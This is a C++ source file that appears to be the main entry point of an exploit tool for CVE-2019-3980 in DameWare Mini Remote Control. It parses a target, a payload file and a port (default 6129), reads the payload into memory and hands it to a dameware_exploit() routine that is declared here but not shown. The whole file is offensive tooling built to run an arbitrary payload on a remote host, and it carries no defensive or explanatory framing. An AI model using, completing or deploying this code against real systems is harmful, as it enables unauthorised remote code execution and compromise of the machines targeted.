#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h> //atoi
#include <stdint.h>
#include <fstream>
#include <vector>

#include "getopt.h"
#include "dameware.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "bcrypt.lib")
#pragma comment (lib, "ncrypt.lib")
#pragma comment (lib, "Crypt32.lib")

// function prototype
void dameware_exploit(char* target, char* payload, size_t payload_len, short port);

void usage()
{
	printf("TODO help message\n");
}

int main(int argc, char** argv)
{
	printf("CVE-2019-3980 exploit for executing given payload\n");

	char* target = NULL;
	char* payload = NULL;
	short port = 6129;

	//argument parsing
	int c = 0;
	while ((c = getopt(argc, argv, (char*)"ht:e:p:")) != -1) {
		switch (c) {
		case 'h':
			usage();
			break;
		case 't':
			target = optarg;
			break;
		case 'e':
			payload = optarg;
			break;
		case 'p':
			port = atoi(optarg);
			break;
		case '?':
			break;
		default:
			usage();
			return -1;
		}
	}

	if (!target || !payload) {
		usage();
		return -1;
	}

	// Initialize Winsock
	WSADATA wsaData = { 0 };
	int res = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (res != 0) {
		wprintf(L"WSAStartup failed: %d\n", res);
		return 1;
	}

	std::ifstream file(payload, std::ios::binary | std::ios::ate);
	std::streamsize size = file.tellg();
	file.seekg(0, std::ios::beg);
	if (size > 0) {
		std::vector<char> buffer(size);
		if (file.read(buffer.data(), size)) {
			dameware_exploit(target, buffer.data(), buffer.size(), port);
		}
	}

	WSACleanup();

	return 0;
}